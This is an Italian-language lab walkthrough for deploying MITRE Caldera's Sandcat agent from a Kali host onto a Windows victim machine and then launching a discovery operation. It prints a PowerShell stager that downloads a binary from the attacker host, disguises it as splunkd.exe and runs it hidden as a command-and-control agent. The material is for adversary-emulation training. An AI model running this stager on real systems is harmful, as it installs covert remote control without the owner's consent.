Aavvia Caldera e apri il browser e vai al sito  `http://localhost:8888` ed effettua il login
> il file per l'installazione e l'avvio di Caldera è presente nella cartella sotto il nome di Installazione_caldera.md  

Vai nella colonna di sinistra e accedi alla voce "agents".   
# Sandcat
Seleziona la voce "+ Deploy an agent" e seleziona l'agent "Sandcat".   
Scegli il sistema operativo della vittima. 
>(per l'attacco abbiamo usato il sistema windows come vittima)   

Inserisci l'indirizzo ip di Kali
```bash
http://<IP Kali>:8888
```
Copia il codice presente sotto la voce "Caldera's default agent, written in GoLang. Communicates through the HTTP(S) contact by default."    
```bash
$server="http://<IP Kali>:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;
rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
```
e inseriscilo in un file.  
trasferisci il file sulla machina vittima.  

Dalla macchina vittima
- Apri con i permessi di amministratore la Powershell ISE  
- Incolla il codice precedentemente salvato e invia
- Anche se da errore ti chiederà il di accettare dei permessi

Dalla macchina Kali dovresi a questo punto essere agganciato alla macchina della vittima  
- ora vai su Operation nella colonna Campaigns e selezione "+ New Operation"  
- Dai un nome alla operazione, seleziona "Discovery" alla voce Adversary e "Alice Filtrers" alla voce Fact Source.  

Ora dovrebbero uscirti tutte le vulnerabilità della macchina precedentemente attaccata  
da qui puoi lanciare i comandi.

